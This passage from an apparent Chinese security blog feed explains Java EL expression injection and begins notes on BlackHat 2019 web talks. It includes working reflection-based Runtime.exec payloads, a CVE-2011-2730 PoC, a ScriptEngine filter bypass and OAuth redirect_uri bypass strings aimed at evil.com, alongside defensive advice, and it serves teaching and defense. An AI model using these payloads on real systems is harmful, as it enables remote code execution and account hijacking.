class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">    pageContext.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_page"</span>);  </span><br><span class="line">    request.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_request"</span>);</span><br><span class="line">    session.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_session"</span>);</span><br><span class="line">    application.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_application"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/5.png" alt=""></p><h4 id="param和paramValues对象"><a href="#param和paramValues对象" class="headerlink" title="param和paramValues对象"></a>param和paramValues对象</h4><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p><p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p><p>接下来的例子表明了如何访问request中的username参数：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"Accessing Request Param"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param["username"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/2.png" alt=""></p><h4 id="header和headerValues对象"><a href="#header和headerValues对象" class="headerlink" title="header和headerValues对象"></a>header和headerValues对象</h4><p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p><p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：<code>${header.user-agent}</code>，或者<code>${header[&quot;user-agent&quot;]}</code>。</p><p>接下来的例子表明了如何访问user-agent信息头：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"User Agent Example"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header["user-agent"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/3.png" alt=""></p><p>header对象返回单一值，而headerValues则返回一个字符串数组。</p><h3 id="EL中的函数"><a href="#EL中的函数" class="headerlink" title="EL中的函数"></a>EL中的函数</h3><p>EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;ns:func(param1, param2, ...)&#125;</span><br></pre></td></tr></table></figure><p>ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;fn:length(&quot;Get my length&quot;)&#125;</span><br></pre></td></tr></table></figure><p>要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用<code>&lt;taglib&gt;</code>标签在JSP文件中包含这些库。</p><h3 id="EL表达式调用Java方法"><a href="#EL表达式调用Java方法" class="headerlink" title="EL表达式调用Java方法"></a>EL表达式调用Java方法</h3><p>看个例子即可。</p><p>先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接”.com”形成域名返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eltest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ELFunc</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doSomething</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str + <span class="string">".com"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>ELFunc<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://www.mi1k7ea.com/ELFunc<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>doSomething<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>eltest.ELFunc<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span> java.lang.String doSomething(java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure><p>JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> uri=<span class="string">"http://www.mi1k7ea.com/ELFunc"</span> prefix=<span class="string">"ELFunc"</span>%&gt;</span><br><span class="line">$&#123;ELFunc:doSomething(<span class="string">"mi1k7ea"</span>)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/6.png" alt=""></p><h2 id="0x03-JSP中启动-禁用EL表达式"><a href="#0x03-JSP中启动-禁用EL表达式" class="headerlink" title="0x03 JSP中启动/禁用EL表达式"></a>0x03 JSP中启动/禁用EL表达式</h2><h3 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h3><p>web.xml中进入如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h3><p>在JSP文件中可以有如下定义：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br></pre></td></tr></table></figure><p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p><p>JSP2.0中默认的启用EL表达式。</p><p>例如如下的JSP代码禁用EL表达式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/4.png" alt=""></p><h2 id="0x04-EL表达式注入漏洞"><a href="#0x04-EL表达式注入漏洞" class="headerlink" title="0x04 EL表达式注入漏洞"></a>0x04 EL表达式注入漏洞</h2><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p><p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p><h3 id="通用PoC"><a href="#通用PoC" class="headerlink" title="通用PoC"></a>通用PoC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line">//获取Web路径</span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;</span><br><span class="line"></span><br><span class="line">//文件头参数</span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line">//获取webRoot</span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line">//执行命令</span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>比如我们在Java程序中可以控制输入EL表达式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;</span><br></pre></td></tr></table></figure><p>如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/11.png" alt=""></p><p>但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。</p><h3 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h3><p>命令执行PoC如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;spring:message text=</span><br><span class="line"><span class="string">"$&#123;/"</span>/<span class="string">".getClass().forName(/"</span>java.lang.Runtime/<span class="string">").getMethod(/"</span>getRuntime/<span class="string">",null).invoke(null,null).exec(/"</span>calc/<span class="string">",null).toString()&#125;"</span>&gt;</span><br><span class="line">&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure><p>再比如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">"http://www.springframework.org/tags"</span> prefix=<span class="string">"spring"</span>%&gt;</span><br><span class="line">&lt;spring:message  text="$&#123;param.a&#125;"&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure><p>访问<code>http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}</code>。</p><p>容器第一次执行EL表达式<code>${param.a}</code>获得了我们输入的<code>${applicationScope}</code>，然后Spring标签获取容器的EL表达式求值对象，把<code>${applicationScope}</code>再次执行掉，形成了漏洞。</p><h3 id="Wooyun案例"><a href="#Wooyun案例" class="headerlink" title="Wooyun案例"></a>Wooyun案例</h3><p>参考Wooyun镜像上的案例：</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0195845.html" target="_blank" rel="noopener">搜狗某系统存在远程EL表达式注入漏洞(命令执行)</a></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196160.html" target="_blank" rel="noopener">工商银行某系统存在远程EL表达式注入漏洞(命令执行)</a></p><h3 id="JUEL示例"><a href="#JUEL示例" class="headerlink" title="JUEL示例"></a>JUEL示例</h3><p>下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。</p><p>EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！</p><p>也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。</p><p>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p><p>更多参考官网：<a href="http://juel.sourceforge.net/" target="_blank" rel="noopener">http://juel.sourceforge.net/</a></p><p>需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。</p><p>Test.java，利用反射调用Runtime类方法实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExpressionFactory expressionFactory = <span class="keyword">new</span> ExpressionFactoryImpl();</span><br><span class="line">        SimpleContext simpleContext = <span class="keyword">new</span> SimpleContext();</span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;";</span></span><br><span class="line">        <span class="comment">// ok</span></span><br><span class="line">        String exp = <span class="string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span>;</span><br><span class="line">        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即触发：</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/7.png" alt=""></p><h2 id="0x05-绕过方法"><a href="#0x05-绕过方法" class="headerlink" title="0x05 绕过方法"></a>0x05 绕过方法</h2><p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p><h3 id="利用反射机制绕过"><a href="#利用反射机制绕过" class="headerlink" title="利用反射机制绕过"></a>利用反射机制绕过</h3><p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p><h3 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h3><p>同SpEL注入中讲到的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/8.png" alt=""></p><h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul><li><p>尽量不使用外部输入的内容作为EL表达式内容；</p></li><li><p>若使用，则严格过滤EL表达式注入漏洞的payload关键字；</p></li><li><p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.runoob.com/jsp/jsp-expression-language.html" target="_blank" rel="noopener">JSP 表达式语言</a></p><p><a href="https://www.cnblogs.com/taoshihan/p/5638449.html" target="_blank" rel="noopener">EL表达式调用java方法</a></p><p><a href="https://www.cnblogs.com/junsec/p/11132652.html" target="_blank" rel="noopener">JAVA WEB EL表达式注入</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="EL注入" scheme="https://www.mi1k7ea.com/tags/EL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2019 Web小结</title>
    <link href="https://www.mi1k7ea.com/2020/04/20/BlackHat-2019-Web%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/20/BlackHat-2019-Web小结/</id>
    <published>2020-04-19T17:16:00.000Z</published>
    <updated>2020-05-10T16:05:17.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2019 Web相关议题，做下学习笔记。</p><h2 id="0x01-Make-Redirection-Evil-Again-URL-Parser-Issues-in-OAuth"><a href="#0x01-Make-Redirection-Evil-Again-URL-Parser-Issues-in-OAuth" class="headerlink" title="0x01 Make Redirection Evil Again - URL Parser Issues in OAuth"></a>0x01 Make Redirection Evil Again - URL Parser Issues in OAuth</h2><p>PDF：</p><p><a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf" target="_blank" rel="noopener">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf</a></p><p><a href="http://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf" target="_blank" rel="noopener">http://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本议题主要介绍利用URL解析问题来绕过限制进行各种任意URL跳转攻击。</p><p>作者先介绍了什么是OAuth 2.0。OAuth（开放授权）是一个开放标准，允许用户授权第三方移动应用访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方移动应用或分享他们数据的所有内容，OAuth2.0是OAuth协议的延续版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。</p><p>OAuth 2.0协议细节如图：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/1.png" alt=""></p><p>但是，如果OAuth 2.0登录时的重定向页面参数如上图的redirect_uri参数可被攻击者控制，那么将会造成任意URL跳转攻击：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/2.png" alt=""></p><p>针对这种攻击场景，开发者往往会采取一系列的校验措施，但是仅有校验完整的URL时才是无风险的，其他的校验方法会存在缺陷：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/3.png" alt=""></p><p>后面就看下几种绕过URL校验的技巧。</p><h3 id="Evil-Slash-Trick（恶意反斜杠）"><a href="#Evil-Slash-Trick（恶意反斜杠）" class="headerlink" title="Evil Slash Trick（恶意反斜杠）"></a>Evil Slash Trick（恶意反斜杠）</h3><p>如图，攻击者在redirect_uri参数中注入<code>https://evil.com\@good.com</code>，该URL在服务端校验时解析的Host识别的是<code>good.com</code>并将该URL内容作为302重定向响应返回给浏览器，由于浏览器会将反斜杠转换为斜杠，因此在客户端实际访问的Host为<code>evil.com</code>：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/4.png" alt=""></p><p>这是因为大多数浏览器都会将<code>/</code>和<code>\</code>视为路径分隔符，当用户在地址栏输入URL时，浏览器都是自动将<code>\</code>替换成<code>/</code>。</p><h3 id="Server-Decoding-Error（服务端解码错误）"><a href="#Server-Decoding-Error（服务端解码错误）" class="headerlink" title="Server Decoding Error（服务端解码错误）"></a>Server Decoding Error（服务端解码错误）</h3><p>如图，攻击者在redirect_uri参数中注入<code>https://evil.com%ff@good.com</code>，这里<code>%ff</code>为超出ASCII范围的字符、并不是正常的URL编码内容，在服务端进行URL校验时由于解码错误导致识别的Host为<code>good.com</code>，当响应给浏览器重定向时该不可打印的字符被统一转换为了<code>?</code>，从而浏览器解析的时候被截断跳转到<code>evil.com</code>：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/5.png" alt=""></p><h3 id="Browser-Decoding-Error（浏览器解码错误）"><a href="#Browser-Decoding-Error（浏览器解码错误）" class="headerlink" title="Browser Decoding Error（浏览器解码错误）"></a>Browser Decoding Error（浏览器解码错误）</h3><p>同上类似，不同之处在于用到<code>%bf</code>+<code>:</code>来组合使得浏览器URL解码错误，然后统一将不可见字符转换为<code>?</code>，从而绕过检测：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/6.png" alt=""></p><h3 id="Domain-Matching-Prefix-Matching（域名和前缀匹配）"><a href="#Domain-Matching-Prefix-Matching（域名和前缀匹配）" class="headerlink" title="Domain Matching+Prefix Matching（域名和前缀匹配）"></a>Domain Matching+Prefix Matching（域名和前缀匹配）</h3><p>如图，服务端用startsWith()函数以及url.host来检测Host和前缀名；Host部分的绕过可以利用前面的反斜杠绕过；前缀部分的校验可以通过注册一个<code>good.com.evil.com</code>即包括前缀弱校验白名单作为子域名：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/7.png" alt=""></p><h3 id="Malformed-Scheme（畸形的Scheme）"><a href="#Malformed-Scheme（畸形的Scheme）" class="headerlink" title="Malformed Scheme（畸形的Scheme）"></a>Malformed Scheme（畸形的Scheme）</h3><p>如图，可以利用浏览器自动补全Scheme的特性，攻击者在redirect_uri参数中注入<code>evil.com://good.com</code>，服务端校验URL识别的是<code>good.com</code>，返回浏览器后URL被补全为<code>https://evil.com://good.com</code>从而成功绕过：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/8.png" alt=""></p><h3 id="IPv6-Address-Parsing-Bug（IPv6地址解析Bug）"><a href="#IPv6-Address-Parsing-Bug（IPv6地址解析Bug）" class="headerlink" title="IPv6 Address Parsing Bug（IPv6地址解析Bug）"></a>IPv6 Address Parsing Bug（IPv6地址解析Bug）</h3><p>如图，某些URL解析器会将<code>[]</code>内的任何字符串视为IPv6主机而没有任何校验：</p><p><img src="/2020/04/20/BlackHat-2019-Web小结/9.png" alt=""></p><h2 id="0x02-Preloading-Insecurity-In-Your-Electron"><a href="#0x02-Preloading-Insecurity-In-Your-Electron" class="headerlink" title="0x02 Preloading Insecurity In Your Electron"></a>0x02 Preloading Insecurity In Your Electron</h2><p>PDF：</p><p><a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf" target="_blank" rel="noopener">https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf</a></p><p><a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron-wp.pdf</a></p><p>Electron历史漏洞：</p><p><a href="https://www.freebuf.com/video/207509.html" target="_blank" rel="noopener">https://www.freebuf.com/video/207509.html</a></p><p>Electron基本安全测试指南：</p><p><a href="https://xz.aliyun.com/t/2461" target="_blank" rel="noopener">https://xz.aliyun.com/t/2461</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" 